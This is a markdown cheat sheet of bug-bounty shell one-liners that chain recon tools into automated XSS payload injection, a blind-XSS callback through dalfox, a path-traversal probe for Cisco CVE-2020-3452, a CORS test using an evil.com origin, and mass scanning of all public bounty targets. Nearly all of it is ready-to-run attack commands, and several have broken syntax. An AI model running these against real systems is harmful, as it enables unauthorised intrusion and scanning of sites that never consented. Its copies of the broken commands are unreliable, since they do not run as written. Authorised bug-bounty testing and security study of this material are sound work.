# loops and one liners for bug bounty 
Credits goes to all those awesome researchers who uploaded these on Twitter



## One Liners for XSS

### You can also use DALFOX to send the result for xss

```bash
cat target_list| gau | egrep -o "http?.*" | grep "="| egrep -v ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | dalfox pipe -blind https://yours.xss.ht -o result.txt
```

### XSS without GF Patterns

```bash
waybackurls testphp.vulnweb.com| grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done

```

### To find XSS using DALFOX using go spider

```bash
gospider -S targets_urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o output.txt
```

### Scan domains and subdomains from Bounty Targets data Using DalFox for XSS

```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; | subfinder -dL domains.txt | httpx -silent -threads 500 | xargs -I@ dalfox url @


```






************************************************************************************************************************************

### Brute Force List of subdomains using FFuf

```bash
for url in ` cat $filename `; do ffuf -c -w path.txt -u $url/FUZZ -o result.json ; done >> result.txt
```

### While Loop For Subfinder To Discovery new Subdoamins

```bash
while true; do subfinder -dL domains.txt -all | anew subdomains1.txt | httpx | notify ; sleep 4600; done
```
Note: Before running the above command make sure you do the below first:
Run `subfinder -dL domains.txt -all >> subdomains1.txt`

Install nuclei, subfinder, Notify and anew

### One liner to fetch all URLs in scope of all public programs @_ayoubfathi_

```bash
curl -s https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/hackerone_data.json | jq -r '.[].targets.in_scope[] | select(.asset_type|contains("URL")) | .asset_identifier' |grep -v "*" | sort
```

If you are getting error jq not found then 
sudo apt-get install jq

(wildcard domains excluded)

### Find Subdomains using Subfinder and opens them on Firefox @payloadartists

```bash
subfinder -d $1 -silent -t 100 | httprobe -c 50 | sort -u | while read line; do firefox $line; sleep 10; done

```
### Using WaybackURL to find Excel File leads to PII Disclosure @M0_SADAT

```bash
gau http://hacked-site.com | waybackurls | grep ".xlsx"
```


### To find CVE 2020-3452 

```bash
while read domains.txt; do curl -s -k "https://$domains/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < domain_list.txt
```







### CORS Missconfiguration @


```bash
site="https://example.com"; gau "$site" | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done

```



